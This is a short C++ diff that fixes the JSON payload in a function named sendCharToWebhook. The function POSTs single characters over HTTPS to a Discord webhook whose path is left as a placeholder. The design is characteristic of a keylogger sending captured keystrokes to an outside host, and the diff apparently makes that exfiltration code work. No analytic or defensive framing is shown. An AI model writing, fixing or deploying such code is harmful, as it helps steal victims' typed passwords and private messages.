@@ -13,7 +13,7 @@ void sendCharToWebhook(char value) {
             HINTERNET hConnect = InternetConnectA(hSession, "discord.com", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
             if (hConnect) {
                 const char* headers = "Content-Type: application/json";
-                std::string postData = "{\"content\":\std::string(1, value)}";
+                std::string postData = "{\"content\":\"" + std::string(1, value) + "\"}";
                 HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "your part of webhook after discord.com", NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
 
                 if (hRequest) {
